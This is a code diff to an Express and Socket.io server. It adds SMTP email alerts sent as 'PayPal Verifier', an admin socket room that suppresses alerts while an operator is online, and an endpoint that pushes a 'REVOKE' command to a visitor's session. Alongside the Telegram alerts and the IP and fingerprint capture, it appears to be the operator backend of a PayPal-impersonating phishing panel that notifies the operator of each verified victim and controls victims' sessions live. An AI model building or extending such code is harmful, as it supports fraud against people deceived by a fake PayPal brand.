@@ -8,6 +8,7 @@ import rateLimit from 'express-rate-limit';
 import fs from 'fs';
 import crypto from 'crypto';
 import https from 'https';
+import nodemailer from 'nodemailer';
 import * as db from './db';
 
 const app = express();
@@ -83,12 +84,28 @@ io.on('connection', (socket) => {
         console.log(`[Socket] ${socket.id} joined session room: ${sessionId}`);
     });
 
+    socket.on('joinAdmin', () => {
+        socket.join('admin');
+        console.log(`[Socket] ${socket.id} joined ADMIN room`);
+    });
+
     socket.on('disconnect', () => {
         console.log('[Socket] Client disconnected:', socket.id);
     });
 });
 
 // --- API Routes ---
+
+// Email Transporter
+const transporter = nodemailer.createTransport({
+    host: process.env.SMTP_HOST || 'smtp.example.com',
+    port: parseInt(process.env.SMTP_PORT || '587'),
+    secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports
+    auth: {
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS
+    }
+});
 
 // Settings Helper
 let cachedSettings: any = {};
@@ -125,10 +142,36 @@ const sendTelegram = (msg: string) => {
     req.end();
 };
 
-const sendEmail = (session: any) => {
+const sendEmail = async (session: any) => {
     if (!cachedSettings.email) return;
-    console.log(`[Email] Would send completion email to ${cachedSettings.email} for session ${session.sessionId}`);
-    // Email implementation stub - needs SMTP or SendGrid
+
+    // Check if Admin is online
+    const adminRoom = io.sockets.adapter.rooms.get('admin');
+    if (adminRoom && adminRoom.size > 0) {
+        console.log(`[Email] Admin online, suppressing email for session ${session.sessionId}`);
+        return;
+    }
+
+    console.log(`[Email] Sending email to ${cachedSettings.email} for session ${session.sessionId}`);
+
+    try {
+        const info = await transporter.sendMail({
+            from: process.env.SMTP_FROM || '"PayPal Verifier" <no-reply@example.com>',
+            to: cachedSettings.email,
+            subject: `✅ Session Verified: ${session.sessionId}`,
+            html: `
+                <h2>Session Verified</h2>
+                <p><strong>Session ID:</strong> ${session.sessionId}</p>
+                <p><strong>IP:</strong> ${session.fingerprint?.ip || session.ip || 'Unknown'}</p>
+                <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
+                <hr>
+                <p>Login to the admin dashboard to view details.</p>
+            `
+        });
+        console.log(`[Email] Email sent: ${info.messageId}`);
+    } catch (error) {
+        console.error(`[Email] Email failed:`, error);
+    }
 };
 
 const getClientIp = (req: express.Request) => {
@@ -272,6 +315,37 @@ app.post('/api/sessions/:id/pin', async (req, res) => {
         }
     } catch (e) {
         res.status(500).json({ error: 'Failed to pin' });
+    }
+});
+
+// Revoke Session
+app.post('/api/sessions/:id/revoke', async (req, res) => {
+    try {
+        const id = req.params.id;
+        console.log('[API] Revoking session:', id);
+
+        const session = await db.getSession(id);
+        if (session) {
+            // Update status
+            session.status = 'Revoked';
+            await db.upsertSession(id, session, session.ip);
+
+            // Queue Command for Client
+            await db.queueCommand(id, 'REVOKE', {});
+
+            // Notify Client (Real-time)
+            io.to(id).emit('command', { action: 'REVOKE', payload: {} });
+
+            // Notify Admins
+            io.emit('sessions-updated');
+
+            res.json({ status: 'revoked' });
+        } else {
+            res.status(404).json({ error: 'Not found' });
+        }
+    } catch (e) {
+        console.error('[API] Revoke failed:', e);
+        res.status(500).json({ error: 'Failed to revoke' });
     }
 });
 
